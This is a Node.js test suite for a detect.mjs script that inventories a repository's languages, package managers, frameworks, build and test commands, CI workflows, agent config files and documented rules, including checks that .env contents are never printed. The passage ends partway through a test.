import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';

import { detect, parseToml, classify, classifyCommand } from '../scripts/detect.mjs';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const SCRIPT = path.join(HERE, '..', 'scripts', 'detect.mjs');
const fixture = (name) => path.join(HERE, 'fixtures', name);

const tmpDirs = [];
function makeTmp() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'detect-test-'));
  tmpDirs.push(dir);
  return dir;
}
function write(root, rel, content) {
  const abs = path.join(root, rel);
  fs.mkdirSync(path.dirname(abs), { recursive: true });
  fs.writeFileSync(abs, content);
}
process.on('exit', () => {
  for (const dir of tmpDirs) fs.rmSync(dir, { recursive: true, force: true });
});

const names = (list) => list.map((x) => x.name);
const cmds = (result, category) => result.commands[category].map((c) => c.cmd);
const framework = (result, name) => result.frameworks.find((f) => f.name === name);

// ---------------------------------------------------------------------------
// Fixtures
// ---------------------------------------------------------------------------

test('node-pnpm-monorepo', () => {
  const r = detect(fixture('node-pnpm-monorepo'));
  assert.equal(r.name, 'acme');
  assert.equal(r.primary, 'node');
  assert.equal(r.layout, 'monorepo');
  assert.deepEqual(r.workspaces, ['apps/web', 'packages/ui']);
  assert.equal(r.packageManager, 'pnpm');
  assert.deepEqual(r.languageVersion, { node: '>=20' });
  assert.equal(r.languages[0].name, 'typescript');
  assert.ok(r.languages[0].evidence.includes('apps/web/tsconfig.json'));

  const next = framework(r, 'next');
  assert.equal(next.version, '15.1.0');
  assert.equal(next.where, 'apps/web/package.json');
  assert.ok(framework(r, 'tailwindcss'));
  assert.ok(framework(r, 'turbo'));
  assert.ok(framework(r, 'vitest'));
  const react = framework(r, 'react');
  assert.deepEqual(react.alsoIn, ['packages/ui/package.json']);

  assert.ok(cmds(r, 'test').includes('pnpm test'));
  assert.ok(cmds(r, 'build').includes('pnpm run build'));
  assert.ok(cmds(r, 'dev').includes('pnpm -C apps/web run dev'));
  // Identical commands from CI are folded into the local entry.
  const localTest = r.commands.test.find((c) => c.cmd === 'pnpm test');
  assert.equal(localTest.source, 'package.json#scripts.test');
  assert.deepEqual(localTest.alsoIn, ['.github/workflows/ci.yml']);
  // Block-scalar `run: |` lines are picked up too.
  assert.ok(cmds(r, 'lint').includes('pnpm lint'));
  assert.deepEqual(cmds(r, 'setup'), ['pnpm install', 'pnpm install --frozen-lockfile']);
  assert.equal(r.commands.setup[0].source, 'implied:pnpm-lock.yaml');
  assert.equal(r.packageManagerVersion, '9.12.0');
  assert.equal(framework(r, 'next').group, 'runtime');
  assert.equal(framework(r, 'turbo').group, 'dev');
  assert.equal(framework(r, 'react').group, 'runtime'); // peer in ui, runtime in web: strongest wins
  assert.equal(framework(r, 'vitest').group, 'dev');
  assert.deepEqual(r.ci, ['.github/workflows/ci.yml']);

  assert.deepEqual(r.docs, ['README.md']);
  assert.equal(r.hardRuleCandidates.length, 1, 'code-fenced "never" must be skipped');
  assert.match(r.hardRuleCandidates[0].text, /^Packages must not import from apps\. Never import/);
  assert.equal(r.hardRuleCandidates[0].source, 'README.md:7');

  assert.deepEqual(r.env.files, ['.env.example']);
  assert.deepEqual(r.env.gitignored, ['.claude/settings.local.json', '.env', '.env.local', 'CLAUDE.local.md']);
  assert.deepEqual(r.warnings, []);
});

test('node-single-npm', () => {
  const r = detect(fixture('node-single-npm'));
  assert.equal(r.name, 'tiny-vite-app');
  assert.equal(r.primary, 'node');
  assert.equal(r.layout, 'single');
  assert.deepEqual(r.workspaces, []);
  assert.equal(r.packageManager, 'npm');
  assert.equal(r.languageVersion.node, 'v20.11.0');
  assert.deepEqual(names(r.frameworks), ['eslint', 'react', 'typescript', 'vite', 'vitest']);
  assert.deepEqual(r.languages[0].evidence, ['package.json', 'tsconfig.json']);

  assert.deepEqual(cmds(r, 'test'), ['npm test']);
  assert.deepEqual(cmds(r, 'lint'), ['npm run lint']);
  assert.deepEqual(cmds(r, 'typecheck'), ['npm run typecheck']);
  assert.deepEqual(cmds(r, 'dev'), ['npm run dev']);
  // `prebuild` is a hook of `build`, not a command of its own.
  assert.deepEqual(cmds(r, 'build'), ['npm run build']);
  assert.deepEqual(r.versionFiles, ['.changeset/', 'CHANGELOG.md', 'package.json']);
});

test('node-bun uses bun.lock and never `bun test` for a test script', () => {
  const r = detect(fixture('node-bun'));
  assert.equal(r.packageManager, 'bun');
  assert.deepEqual(cmds(r, 'test'), ['bun run test']);
});

test('python-uv', () => {
  const r = detect(fixture('python-uv'));
  assert.equal(r.name, 'svc');
  assert.equal(r.primary, 'python');
  assert.equal(r.packageManager, 'uv');
  assert.equal(r.languageVersion.python, '>=3.12');
  assert.deepEqual(names(r.frameworks), ['fastapi', 'pydantic', 'pytest', 'ruff']);
  assert.equal(framework(r, 'fastapi').version, '0.115');
  assert.equal(framework(r, 'fastapi').range, '>=');
  assert.deepEqual(cmds(r, 'test'), ['uv run pytest']);
  assert.deepEqual(cmds(r, 'lint'), ['uv run ruff check .']);
  assert.deepEqual(cmds(r, 'format'), ['uv run ruff format .']);
  assert.deepEqual(cmds(r, 'dev'), ['poe serve']);
  assert.deepEqual(r.versionFiles, ['pyproject.toml']);
});

test('rust-workspace', () => {
  const r = detect(fixture('rust-workspace'));
  assert.equal(r.primary, 'rust');
  assert.equal(r.layout, 'monorepo');
  assert.deepEqual(r.workspaces, ['crates/api', 'crates/core']);
  assert.equal(r.packageManager, 'cargo');
  assert.deepEqual(r.languageVersion.rust, { edition: '2024', rustVersion: '1.85', toolchain: 'stable' });
  assert.deepEqual(names(r.frameworks), ['axum', 'serde', 'tokio']);
  // `tokio.workspace = true` should not hide the version declared at the workspace root.
  assert.equal(framework(r, 'tokio').version, '1.40');
  assert.equal(framework(r, 'tokio').where, 'Cargo.toml');
  assert.deepEqual(cmds(r, 'test'), ['cargo test --workspace']);
  assert.deepEqual(cmds(r, 'lint'), ['cargo clippy --workspace --all-targets']);
});

test('go-mod', () => {
  const r = detect(fixture('go-mod'));
  assert.equal(r.name, 'svc');
  assert.equal(r.primary, 'go');
  assert.equal(r.packageManager, 'go');
  assert.equal(r.languageVersion.go, '1.22');
  assert.deepEqual(names(r.frameworks), ['chi']);
  assert.equal(framework(r, 'chi').version, 'v5.0.12');
  assert.deepEqual(cmds(r, 'test'), ['make test', 'go test ./...']);
  assert.equal(r.commands.test[0].source, 'Makefile#test');
  assert.deepEqual(cmds(r, 'build'), ['make build', 'go build ./...']);
  // Makefile assignments and .PHONY are not targets.
  assert.deepEqual(cmds(r, 'other'), []);
});

test('mixed-lockfiles warns instead of guessing silently', () => {
  const r = detect(fixture('mixed-lockfiles'));
  assert.equal(r.warnings.length, 1);
  assert.match(r.warnings[0], /multiple lockfiles/);
  assert.match(r.warnings[0], /package-lock\.json/);
  assert.match(r.warnings[0], /yarn\.lock/);
  assert.ok(['npm', 'yarn'].includes(r.packageManager));
});

test('existing-agents', () => {
  const r = detect(fixture('existing-agents'));
  assert.deepEqual(
    r.agentConfigs.map((a) => a.path),
    ['.claude/settings.json', '.cursor/rules/x.mdc', '.github/copilot-instructions.md', 'AGENTS.md', 'CLAUDE.md', 'sub/AGENTS.md'],
  );
  assert.equal(r.agentConfigs.find((a) => a.path === 'sub/AGENTS.md').tool, 'agents');
  assert.equal(r.agentConfigs.find((a) => a.path === '.cursor/rules/x.mdc').tool, 'cursor');
  assert.equal(r.primary, 'unknown');
});

test('empty repo still yields a complete, stable shape', () => {
  const r = detect(fixture('empty'));
  assert.equal(r.name, 'empty');
  assert.equal(r.primary, 'unknown');
  assert.equal(r.packageManager, null);
  assert.equal(r.layout, 'single');
  assert.deepEqual(r.languages, []);
  assert.deepEqual(r.docs, ['README.md']);
  assert.deepEqual(r.agentConfigs, []);
  assert.deepEqual(r.languageVersion, {});
  assert.deepEqual(Object.keys(r.commands), ['build', 'test', 'lint', 'format', 'typecheck', 'dev', 'setup', 'other']);
  assert.deepEqual(Object.keys(r), [
    'root', 'name', 'languages', 'primary', 'layout', 'workspaces', 'packageManager', 'packageManagerVersion', 'frameworks',
    'languageVersion', 'commands', 'ci', 'agentConfigs', 'docs', 'hardRuleCandidates', 'infra', 'env',
    'versionFiles', 'generated', 'warnings',
  ]);
});

test('output is deterministic', () => {
  const a = JSON.stringify(detect(fixture('node-pnpm-monorepo')));
  const b = JSON.stringify(detect(fixture('node-pnpm-monorepo')));
  assert.equal(a, b);
});

// ---------------------------------------------------------------------------
// CLI
// ---------------------------------------------------------------------------

function runCli(args, options = {}) {
  return spawnSync(process.execPath, args, { encoding: 'utf8', ...options });
}

test('CLI prints one valid JSON object and exits 0', () => {
  const res = runCli([SCRIPT, fixture('node-single-npm')]);
  assert.equal(res.status, 0);
  const parsed = JSON.parse(res.stdout);
  assert.equal(parsed.name, 'tiny-vite-app');
  assert.equal(parsed.root, fixture('node-single-npm'));
});

test('CLI defaults to the current directory', () => {
  const res = runCli([SCRIPT], { cwd: fixture('go-mod') });
  assert.equal(res.status, 0);
  assert.equal(JSON.parse(res.stdout).primary, 'go');
});

test('CLI works through a symlinked path', { skip: process.platform === 'win32' }, () => {
  const dir = makeTmp();
  const link = path.join(dir, 'linked-detect.mjs');
  fs.symlinkSync(SCRIPT, link);
  const res = runCli([link, fixture('python-uv')]);
  assert.equal(res.status, 0);
  assert.equal(JSON.parse(res.stdout).primary, 'python');
});

test('CLI exits 0 for a missing directory and reports a warning', () => {
  const res = runCli([SCRIPT, path.join(os.tmpdir(), 'definitely-not-here-xyz')]);
  assert.equal(res.status, 0);
  const parsed = JSON.parse(res.stdout);
  assert.equal(parsed.primary, 'unknown');
  assert.ok(parsed.warnings.length > 0);
});

test('importing the module does not run the CLI', () => {
  const res = runCli(['--input-type=module', '-e', `import ${JSON.stringify(SCRIPT)}; console.log('quiet');`]);
  assert.equal(res.stdout.trim(), 'quiet');
});

// ---------------------------------------------------------------------------
// Safety and bounds
// ---------------------------------------------------------------------------

test('.env contents are never read or printed', () => {
  const dir = makeTmp();
  fs.cpSync(fixture('node-pnpm-monorepo'), dir, { recursive: true });
  write(dir, '.env', 'SECRET=do-not-print\n');
  write(dir, '.env.local', 'TOKEN=do-not-print-either\n');
  write(dir, 'apps/web/.env.production', 'KEY=do-not-print-nested\n');

  const res = runCli([SCRIPT, dir]);
  assert.equal(res.status, 0);
  assert.ok(!res.stdout.includes('do-not-print'));
  const parsed = JSON.parse(res.stdout);
  assert.deepEqual(parsed.env.files, ['.env', '.env.example', '.env.local', 'apps/web/.env.production']);
  assert.deepEqual(parsed.env.gitignored, ['.claude/settings.local.json', '.env', '.env.local', 'CLAUDE.local.md']);
});

test('skips node_modules, target, and other vendored dirs', () => {
  const dir = makeTmp();
  write(dir, 'package.json', JSON.stringify({ name: 'app', dependencies: { express: '^4.0.0' } }));
  write(dir, 'package-lock.json', '{}');
  write(dir, 'node_modules/next/package.json', JSON.stringify({ name: 'next', dependencies: { react: '1' } }));
  write(dir, 'node_modules/pkg/index.ts', 'export {}');
  write(dir, 'target/Cargo.toml', '[package]\nname = "x"\n');
  write(dir, 'vendor/go.mod', 'module x\n');
  write(dir, '.venv/pyproject.toml', '[project]\nname = "x"\n');

  const r = detect(dir);
  assert.deepEqual(names(r.frameworks), ['express']);
  assert.deepEqual(names(r.languages), ['javascript']);
  assert.equal(r.primary, 'node');
});

test('does not descend past the depth cap or into symlinked dirs', { skip: process.platform === 'win32' }, () => {
  const dir = makeTmp();
  write(dir, 'package.json', '{"name":"root"}');
  write(dir, 'a/b/c/d/package.json', JSON.stringify({ dependencies: { next: '1.0.0' } }));
  const outside = makeTmp();
  write(outside, 'package.json', JSON.stringify({ dependencies: { vue: '3.0.0' } }));
  fs.symlinkSync(outside, path.join(dir, 'linked'));

  const r = detect(dir);
  assert.deepEqual(r.frameworks, []);
});

test('a malformed manifest becomes a warning, not a crash', () => {
  const dir = makeTmp();
  write(dir, 'package.json', '{ not json');
  write(dir, 'pyproject.toml', '[project\nname = ');
  write(dir, 'Cargo.toml', '\u0000\u0001garbage');

  const res = runCli([SCRIPT, dir]);
  assert.equal(res.status, 0);
  const parsed = JSON.parse(res.stdout);
  assert.ok(parsed.warnings.some((w) => w.includes('malformed JSON in package.json')));
});

test('the walk is capped on huge trees', () => {
  const dir = makeTmp();
  write(dir, 'package.json', '{"name":"big"}');
  for (let i = 0; i < 5200; i++) fs.writeFileSync(path.join(dir, `f${i}.txt`), '');
  const r = detect(dir);
  assert.ok(r.warnings.some((w) => w.includes('more than 500 files')));
  assert.equal(r.name, 'big'); // shallow files still win
});

test('bun.lockb is detected by name only, never read', () => {
  const dir = makeTmp();
  write(dir, 'package.json', '{"name":"b"}');
  fs.writeFileSync(path.join(dir, 'bun.lockb'), Buffer.from([0, 255, 254, 1, 2, 3]));
  const r = detect(dir);
  assert.equal(r.packageManager, 'bun');
  assert.deepEqual(r.warnings, []);
});

test('packageManager field wins and a disagreeing lockfile warns', () => {
  const dir = makeTmp();
  write(dir, 'package.json', JSON.stringify({ name: 'p', packageManager: 'pnpm@9.0.0' }));
  write(dir, 'yarn.lock', '');
  const r = detect(dir);
  assert.equal(r.packageManager, 'pnpm');
  assert.ok(r.warnings.some((w) => w.includes('packageManager field says pnpm')));
});

test('no lockfile leaves packageManager null but still renders npm commands', () => {
  const dir = makeTmp();
  write(dir, 'package.json', JSON.stringify({ name: 'p', scripts: { test: 'node --test' } }));
  const r = detect(dir);
  assert.equal(r.packageManager, null);
  assert.deepEqual(cmds(r, 'test'), ['npm test']);
  assert.ok(r.warnings.some((w) => w.includes('no lockfile')));
});

// ---------------------------------------------------------------------------
// Units
// ---------------------------------------------------------------------------

test('parseToml handles tables, multi-line arrays, inline tables, and comments', () => {
  const t = parseToml(`
# top comment
[package]
name = "demo" # trailing
edition = "2024"

[dependencies]
serde = { version = "1.0", features = ["derive", "rc"] }
tokio.workspace = true
list = [
  "a", # first
  "b#not-a-comment",
]

[tool.poetry.group.dev.dependencies]
pytest = "^8.0"

[dependencies.axum]
version = "0.7"
`);
  assert.equal(t.package.name, 'demo');
  assert.equal(t.package.edition, '2024');
  assert.deepEqual(t.dependencies.serde, { version: '1.0', features: ['derive', 'rc'] });
  assert.equal(t.dependencies['tokio.workspace'], true);
  assert.deepEqual(t.dependencies.list, ['a', 'b#not-a-comment']);
  assert.equal(t['tool.poetry.group.dev.dependencies'].pytest, '^8.0');
  assert.equal(t['dependencies.axum'].version, '0.7');
});

test('classify by name and command', () => {
  assert.equal(classify('test:unit'), 'test');
  assert.equal(classify('check-types'), 'typecheck');
  assert.equal(classify('lint:fix'), 'lint');
  assert.equal(classify('format'), 'format');
  assert.equal(classify('cargo clippy --all-targets'), 'lint');
  assert.equal(classify('npm i -g npm@latest'), 'other'); // "latest" is not "test"
  assert.equal(classify('storybook'), 'other');
  assert.equal(classify('start'), 'dev');
});

test('.gitignore negation and directory rules', () => {
  const dir = makeTmp();
  write(dir, '.gitignore', '# comment\n.claude/\n!.claude/settings.json\n*.local.md\n/.mcp.json\n');
  write(dir, 'package.json', '{}');
  const r = detect(dir);
  // The parent directory is ignored, so the negated file cannot re-include it; the local files stay ignored.
  assert.deepEqual(r.env.gitignored, ['.claude/settings.local.json', '.mcp.json', 'CLAUDE.local.md']);
});

test('workspace globs honour exclusions and require a manifest', () => {
  const dir = makeTmp();
  write(dir, 'package.json', JSON.stringify({ name: 'r', workspaces: ['packages/*', '!packages/skip'] }));
  write(dir, 'packages/a/package.json', '{}');
  write(dir, 'packages/skip/package.json', '{}');
  write(dir, 'packages/docs-only/README.md', '');
  const r = detect(dir);
  assert.deepEqual(r.workspaces, ['packages/a']);
  assert.equal(r.layout, 'monorepo');
});

test('go.work and uv workspaces resolve members', () => {
  const go = makeTmp();
  write(go, 'go.work', 'go 1.22\n\nuse (\n\t./svc\n\t./lib\n)\n');
  write(go, 'svc/go.mod', 'module svc\n');
  write(go, 'lib/go.mod', 'module lib\n');
  assert.deepEqual(detect(go).workspaces, ['lib', 'svc']);

  const uv = makeTmp();
  write(uv, 'pyproject.toml', '[project]\nname = "r"\n\n[tool.uv.workspace]\nmembers = ["packages/*"]\n');
  write(uv, 'packages/a/pyproject.toml', '[project]\nname = "a"\n');
  assert.deepEqual(detect(uv).workspaces, ['packages/a']);
});

test('hard-rule candidates skip tables, fences, and repeat lines', () => {
  const dir = makeTmp();
  write(dir, 'CONTRIBUTING.md', [
    '| `CLAUDE.md` | always |',
    '- Always run the linter.',
    '- Always run the linter.',
    '~~~',
    'Never inside a fence',
    '~~~',
    'Plain sentence without signals.',
    '',
    'Handlers MUST be idempotent. ' + 'x'.repeat(300),
  ].join('\n'));
  write(dir, 'docs/adr/0001-db.md', 'We don\u2019t use ORMs here.\n');
  const r = detect(dir);
  assert.deepEqual(r.hardRuleCandidates.map((c) => c.source), ['docs/adr/0001-db.md:1', 'CONTRIBUTING.md:2', 'CONTRIBUTING.md:9']);
  assert.equal(r.hardRuleCandidates[1].text, 'Always run the linter.');
  assert.ok(r.hardRuleCandidates[2].text.length <= 240);
  assert.deepEqual(r.docs, ['CONTRIBUTING.md', 'docs/adr/0001-db.md']);
});

// ---------------------------------------------------------------------------
// Regressions found on real repositories
// ---------------------------------------------------------------------------

function repoWithWorkflow(runs, extra = {}) {
  const dir = makeTmp();
  write(dir, 'Cargo.toml', '[package]\nname = "demo"\nversion = "0.1.0"\n');
  const steps = runs.map((r) => (r.includes('\n') ? `      - run: |\n${r.split('\n').map((l) => `          ${l}`).join('\n')}` : `      - run: ${r}`));
  write(dir, '.github/workflows/ci.yml', ['name: ci', 'on: [push]', 'jobs:', '  j:', '    steps:', ...steps, ''].join('\n'));
  for (const [rel, content] of Object.entries(extra)) write(dir, rel, content);
  return dir;
}
const allCmds = (r) => Object.values(r.commands).flat().map((c) => c.cmd);

test('CI noise: expressions, assignments, tooling, publishing, and ci/ scripts are dropped', () => {
  const noise = [
    '${{ env.CARGO }} build --verbose --workspace ${{ env.TARGET_FLAGS }}',
    'dir="$RUNNER_TEMP/cross-download"',
    'version="$(uv run python scripts/release.py current-version)"',
    'exit_status=$?',
    'curl -LO "https://example.com/x.tar.gz"',
    'tar xf x.tar.gz',
    'sudo apt-get install g++ --yes',
    'brew install jq',
    'git config user.name "bot"',
    'git commit -m "auto format"',
    'git push --force origin main',
    'gh release create v1',
    'docker login ghcr.io',
    'npm publish --provenance',
    'cargo publish',
    'twine upload dist/*',
    'ci/ubuntu-install-packages',
    './.github/scripts/prepare.sh --fast',
    'node .github/scripts/matrix.js >> out.txt',
    'done > "$RUNNER_TEMP/changed"',
    'test_*.py) printf "%s" "$file" ;;',
    'echo "hello"',
  ];
  const r = detect(repoWithWorkflow([...noise, 'cargo test --workspace', 'cargo clippy -- -D warnings']));
  assert.deepEqual(allCmds(r).filter((c) => !c.startsWith('cargo ')), []);
  assert.ok(allCmds(r).includes('cargo clippy -- -D warnings'));
  assert.ok(allCmds(r).includes('cargo test --workspace'));
});

test('CI keeps env-prefixed commands and docker build', () => {
  const r = detect(repoWithWorkflow(['RUSTFLAGS="-D warnings" cargo build --release', 'docker build -t demo .']));
  assert.deepEqual(cmds(r, 'build').filter((c) => !c.startsWith('cargo build --workspace') && c !== 'cargo build'), [
    'RUSTFLAGS="-D warnings" cargo build --release',
    'docker build -t demo .',
  ]);
});

test('setup category: installs are classified by command before name', () => {
  for (const cmd of [
    'npm ci', 'npm install', 'pnpm install --frozen-lockfile', 'yarn install', 'yarn', 'bun install', 'uv sync',
    'uv sync --locked --no-dev --group docs', 'pip install --group tests --editable .[all]', 'poetry install',
    'bundle install', 'go mod download', 'cargo fetch', 'composer install',
  ]) {
    assert.equal(classifyCommand(cmd), 'setup', cmd);
  }
  assert.equal(classifyCommand('yarn test'), 'test');
  assert.equal(classifyCommand('uv run --no-dev pytest'), 'test');
  assert.equal(classifyCommand('bundle exec rspec'), 'other');
  assert.equal(classifyCommand('uv run --no-sync pytest tests'), 'test');

  const r = detect(repoWithWorkflow([
    'uv sync --no-dev --group tests --extra all',
    'uv sync --locked --no-dev --group docs',
    'pip install --group tests --editable .[all]',
    'uv run pytest',
  ]));
  assert.deepEqual(cmds(r, 'setup'), [
    'uv sync --no-dev --group tests --extra all',
    'uv sync --locked --no-dev --group docs',
    'pip install --group tests --editable .[all]',
  ]);
  assert.deepEqual(cmds(r, 'dev'), []);
  assert.ok(cmds(r, 'test').includes('uv run pytest'));
  assert.ok(!cmds(r, 'test').some((c) => c.includes('sync') || c.includes('pip install')));
});

test('local sources win: at most 3 CI commands per category, duplicates fold into alsoIn', () => {
  const runs = ['cargo test', 'cargo test -p a', 'cargo test -p b', 'cargo test -p c', 'cargo test -p d', 'cargo test -p e'];
  const r = detect(repoWithWorkflow(runs));
  const ci = r.commands.test.filter((c) => c.source === '.github/workflows/ci.yml');
  assert.deepEqual(ci.map((c) => c.cmd), ['cargo test -p a', 'cargo test -p b', 'cargo test -p c']);
  // `cargo test` is identical to the implied command, so it folds into it instead of using a CI slot.
  const implied = r.commands.test.find((c) => c.cmd === 'cargo test');
  assert.equal(implied.source, 'implied:Cargo.toml');
  assert.deepEqual(implied.alsoIn, ['.github/workflows/ci.yml']);
});

test('identical commands keep the first source and list the others in alsoIn', () => {
  const dir = makeTmp();
  write(dir, 'package.json', JSON.stringify({ name: 'p', scripts: { test: 'vitest' } }));
  write(dir, 'package-lock.json', '{}');
  write(dir, 'Makefile', 'test:\n\tnpm test\n');
  write(dir, '.github/workflows/ci.yml', 'jobs:\n  j:\n    steps:\n      - run: npm test\n');
  write(dir, '.github/workflows/other.yml', 'jobs:\n  j:\n    steps:\n      - run: npm test\n');
  const r = detect(dir);
  const entry = r.commands.test.find((c) => c.cmd === 'npm test');
  assert.equal(entry.source, 'package.json#scripts.test');
  assert.deepEqual(entry.alsoIn, ['.github/workflows/ci.yml', '.github/workflows/other.yml']);
  assert.equal(r.commands.test.filter((c) => c.cmd === 'npm test').length, 1);
});

test('without local sources CI commands are still capped', () => {
  const runs = Array.from({ length: 30 }, (_, i) => `cargo test -p crate${i}`);
  const dir = makeTmp();
  write(dir, '.github/workflows/ci.yml', `jobs:\n  j:\n    steps:\n${runs.map((c) => `      - run: ${c}`).join('\n')}\n`);
  assert.equal(detect(dir).commands.test.length, 10);
});

test('PEP 508: first specifier is the version, full spec goes to range', () => {
  const dir = makeTmp();
  write(dir, 'pyproject.toml', [
    '[project]',
    'name = "app"',
    'dependencies = ["flask>=3.0.0,<4.0.0", "pydantic>=2.9", "sqlalchemy==2.0.1"]',
    '',
  ].join('\n'));
  const r = detect(dir);
  assert.deepEqual(
    [framework(r, 'flask').version, framework(r, 'flask').range],
    ['3.0.0', '>=3.0.0,<4.0.0'],
  );
  assert.deepEqual([framework(r, 'pydantic').version, framework(r, 'pydantic').range], ['2.9', '>=']);
  assert.deepEqual([framework(r, 'sqlalchemy').version, framework(r, 'sqlalchemy').range], ['2.0.1', '==']);
});

test('npm ranges with several specifiers behave the same way', () => {
  const dir = makeTmp();
  write(dir, 'package.json', JSON.stringify({ name: 'p', dependencies: { react: '^17.0.0 || ^18.0.0', vue: '>=3.0.0 <4' } }));
  const r = detect(dir);
  assert.deepEqual([framework(r, 'react').version, framework(r, 'react').range], ['17.0.0', '^17.0.0 || ^18.0.0']);
  assert.deepEqual([framework(r, 'vue').version, framework(r, 'vue').range], ['3.0.0', '>=3.0.0 <4']);
});

test('a project is not reported as its own framework', () => {
  // Node: a package named `next`, depended on by a sibling workspace.
  const node = makeTmp();
  write(node, 'package.json', JSON.stringify({ name: 'next-monorepo', workspaces: ['packages/*'] }));
  write(node, 'packages/next/package.json', JSON.stringify({ name: 'next', dependencies: { react: '^19.0.0' } }));
  write(node, 'packages/app/package.json', JSON.stringify({ name: 'app', dependencies: { next: 'workspace:*' } }));
  assert.deepEqual(names(detect(node).frameworks), ['react']);

  // Python: a package named fastapi that lists itself in a dev group.
  const py = makeTmp();
  write(py, 'pyproject.toml', '[project]\nname = "FastAPI"\ndependencies = ["pydantic>=2"]\n\n[dependency-groups]\ntests = ["fastapi[all]", "pytest>=8"]\n');
  assert.deepEqual(names(detect(py).frameworks), ['pydantic', 'pytest']);

  // Go: examples with their own go.mod require the root module.
  const go = makeTmp();
  write(go, 'go.mod', 'module github.com/go-chi/chi/v5\n\ngo 1.22\n');
  write(go, '_examples/rest/go.mod', 'module rest-example\n\ngo 1.22\n\nrequire (\n\tgithub.com/go-chi/chi/v5 v5.0.1\n\tgithub.com/gin-gonic/gin v1.9.0\n)\n');
  assert.deepEqual(names(detect(go).frameworks), ['gin']);

  // Rust: a path dependency on a sibling crate named like a framework.
  const rust = makeTmp();
  write(rust, 'Cargo.toml', '[workspace]\nmembers = ["serde", "app"]\n');
  write(rust, 'serde/Cargo.toml', '[package]\nname = "serde"\nversion = "1.0.0"\n');
  write(rust, 'app/Cargo.toml', '[package]\nname = "app"\nversion = "0.1.0"\n\n[dependencies]\nserde = { path = "../serde" }\ntokio = "1"\n');
  assert.deepEqual(names(detect(rust).frameworks), ['tokio']);
});

test('fixtures hold no runnable scripts and every script in test/ is a .test.mjs file', () => {
  const scriptPattern = /\.(c|m)?js$/;

  // Recursively: nothing under test/fixtures/ may be picked up by `node --test`.
  const fixtureScripts = [];
  const visit = (dir) => {
    for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
      const abs = path.join(dir, entry.name);
      if (entry.isDirectory()) visit(abs);
      else if (scriptPattern.test(entry.name)) fixtureScripts.push(path.relative(HERE, abs));
    }
  };
  visit(path.join(HERE, 'fixtures'));
  // graph-* fixtures are source trees for graph.mjs and legitimately contain .js files.
  assert.deepEqual(fixtureScripts.filter((f) => !f.startsWith(path.join('fixtures', 'graph-'))), []);

  // Directly in test/: every script must be a .test.mjs file.
  const badTopLevel = fs
    .readdirSync(HERE, { withFileTypes: true })
    .filter((entry) => entry.isFile() && scriptPattern.test(entry.name) && !entry.name.endsWith('.test.mjs'))
    .map((entry) => entry.name);
  assert.deepEqual(badTopLevel, []);
});

// ---------------------------------------------------------------------------
// Round 3: rule sources, package manager version and default setup, dependency groups
// ---------------------------------------------------------------------------

test('hard rules: README prose is ignored unless under a rules heading or shouted', () => {
  const dir = makeTmp();
  write(dir, 'README.md', [
    '# App',
    '',
    'Check that it has a required attribute `name`.',
    '- `httpx` - Required if you want to use the TestClient.',
    'You should never mind this tutorial line.',
    '',
    '## Development',
    '',
    'Never edit files in `generated/` by hand.',
    '- `--force` - Never use this flag.',
    'If you want, you must read the docs.',
    '',
    '## Other',
    '',
    'Secrets MUST NOT be committed.',
  ].join('\n'));
  const r = detect(dir);
  assert.deepEqual(
    r.hardRuleCandidates.map((c) => [c.source, c.text]),
    [['README.md:9', 'Never edit files in `generated/` by hand.'], ['README.md:15', 'Secrets MUST NOT be committed.']],
  );
});

test('hard rules: CONTRIBUTING, docs/**/contributing, ADRs and existing AGENTS.md all count', () => {
  const dir = makeTmp();
  write(dir, 'CONTRIBUTING.md', 'Changes that alter behaviour must be captured by `changeset`.\n');
  write(dir, 'docs/en/docs/contributing.md', 'Do not commit build output.\n');
  write(dir, 'docs/de/docs/contributing.md', 'Nicht doch. Do not translate this.\n');
  write(dir, 'docs/decisions/0002-queue.md', 'Workers shall never share state.\n');
  write(dir, 'AGENTS.md', '- Never run migrations in tests.\n');
  const r = detect(dir);
  assert.deepEqual(r.hardRuleCandidates.map((c) => c.source).sort(), [
    'AGENTS.md:1', 'CONTRIBUTING.md:1', 'docs/decisions/0002-queue.md:1', 'docs/en/docs/contributing.md:1',
  ]);
  assert.deepEqual(r.docs, ['CONTRIBUTING.md', 'docs/decisions/0002-queue.md', 'docs/en/docs/contributing.md']);
});

test('hard rules: imperative "always" counts, descriptive "always" does not; long lines end cleanly', () => {
  const dir = makeTmp();
  const short = 'word '.repeat(35);
  const long = 'word '.repeat(60);
  write(dir, 'CONTRIBUTING.md', [
    'You can always use the web UI instead.',
    'Always run `make check` first.',
    `First sentence is harmless. ${short}and it must stay under the limit. Trailing sentence.`,
    `${long}must be kept short ${long}`,
  ].join('\n\n'));
  const r = detect(dir);
  assert.deepEqual(r.hardRuleCandidates.map((c) => c.source), ['CONTRIBUTING.md:3', 'CONTRIBUTING.md:5', 'CONTRIBUTING.md:7']);
  // Line 3 is cut at the sentence that carries the rule, with no ellipsis.
  assert.ok(r.hardRuleCandidates[1].text.startsWith('word word'));
  assert.ok(r.hardRuleCandidates[1].text.endsWith('under the limit.'));
  // Line 4 has no sentence end within the limit, so it is cut at a word with an ellipsis.
  assert.ok(r.hardRuleCandidates[2].text.endsWith('…'));
  for (const c of r.hardRuleCandidates) assert.ok(c.text.length <= 240, String(c.text.length));
});

test('hard rules are capped at 25', () => {
  const dir = makeTmp();
  write(dir, 'CONTRIBUTING.md', Array.from({ length: 40 }, (_, i) => `Never do thing number ${i}.`).join('\n\n'));
  write(dir, 'docs/adr/a.md', Array.from({ length: 40 }, (_, i) => `Never do adr thing ${i}.`).join('\n\n'));
  write(dir, 'AGENTS.md', Array.from({ length: 40 }, (_, i) => `Never do agent thing ${i}.`).join('\n\n'));
  assert.equal(detect(dir).hardRuleCandidates.length, 25);
});

test('packageManagerVersion comes from the packageManager field, hash stripped', () => {
  const dir = makeTmp();
  write(dir, 'package.json', JSON.stringify({ name: 'p', packageManager: 'pnpm@10.8.0+sha512.abcdef' }));
  const r = detect(dir);
  assert.equal(r.packageManager, 'pnpm');
  assert.equal(r.packageManagerVersion, '10.8.0');
  assert.equal(detect(fixture('node-single-npm')).packageManagerVersion, null);
});

test('default setup command per package manager when none is declared', () => {
  const cases = [
